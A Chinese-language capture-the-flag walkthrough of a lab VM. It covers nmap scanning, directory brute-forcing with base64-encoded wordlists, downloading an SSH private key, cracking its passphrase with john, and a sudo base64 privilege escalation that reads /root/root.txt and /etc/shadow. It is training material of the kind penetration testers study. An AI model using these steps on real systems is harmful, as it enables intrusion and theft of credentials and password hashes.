主机探测

```
nmap -sn 192.168.56.0/24
```

![image-20250604164305225](./assets/image-20250604164305225.png)

确定靶机ip：192.168.56.108



端口扫描

```
set ip 192.168.56.108
sudo nmap -sT -p- --min-rate 1000 $ip -oN ./portscan
```

![image-20250604164356505](./assets/image-20250604164356505.png)



提取端口信息并进行详细结果扫描

```
set port $(cat ./portscan | grep open | awk -F'/' '{print $1}' | paste -sd,)
sudo nmap -sCV -O -p $port $ip -oN ./detailscan
```

![image-20250604164725326](./assets/image-20250604164725326.png)

开放了22和80端口



访问80端口

![image-20250604164840650](./assets/image-20250604164840650.png)

base64

解码

![image-20250604164917786](./assets/image-20250604164917786.png)

出现用户lucas，同时提示要BASE64编码



查看页面源码

![image-20250604165016090](./assets/image-20250604165016090.png)

可能是密码字典

![image-20250604165059709](./assets/image-20250604165059709.png)

尝试目录扫描

```
dirsearch -u http://192.168.56.108
```

![image-20250604165159759](./assets/image-20250604165159759.png)

无结果



结合先前得到的提示，可能需要对字典进行base64编码

写一个简单的脚本

```
for i in $(cat /usr/share/seclists/Discovery/Web-Content/common.txt)
do
	echo $i | base64 >> ./common.dic
done
```

```
bash dic.sh
cat common.dic | head -n5
```



![](./assets/image-20250604165425066.png)



重新尝试目录扫描

```
dirsearch -u http://192.168.56.108 -w common.dic
```

![image-20250604165617992](./assets/image-20250604165617992.png)



依次解码

![image-20250604165813077](./assets/image-20250604165813077.png)

robots.txt和id_rsa



![image-20250604165726827](./assets/image-20250604165726827.png)



base64解码

```
curl -s http://192.168.56.108/aWRfcnNhCg== | base64 -d > id_rsa
curl -s http://192.168.56.108/cm9ib3RzLnR4dAo= | base64 -d > robots.txt
```

![image-20250604170658237](./assets/image-20250604170658237.png)



尝试ssh登录

```
chmod 400 id_rsa
ssh lucas@192.168.56.108 -i id_rsa
```

![image-20250604170814867](./assets/image-20250604170814867.png)

需要密码，结合之前得到的字典



爆破失败

```
ssh2john id_rsa > hash
john -w=passwd.dic hash
```

![image-20250604171002776](./assets/image-20250604171002776.png)

结合先前提示，对passwd.dic进行base64编码处理



```
for i in $(cat passwd.dic)
do
	echo $i | base64 >> passbase.dic
done
```

```
bash passwd.sh
john -w=passwdbase.dic hash
```

![image-20250604171145273](./assets/image-20250604171145273.png)

得到密码



成功登录

![image-20250604171247898](./assets/image-20250604171247898.png)



得到user.txt

![image-20250604171316168](./assets/image-20250604171316168.png)



```
sudo -l
```

![image-20250604171331406](./assets/image-20250604171331406.png)

无密码执行base64

那么可以尝试利用base64实现任意文件读取



尝试直接读取/root/root.txt

```
sudo base64 /root/root.txt | base64 -d
```

![image-20250604171540443](./assets/image-20250604171540443.png)

或是读取/etc/shadow然后尝试爆破root密码

![image-20250604171600886](./assets/image-20250604171600886.png)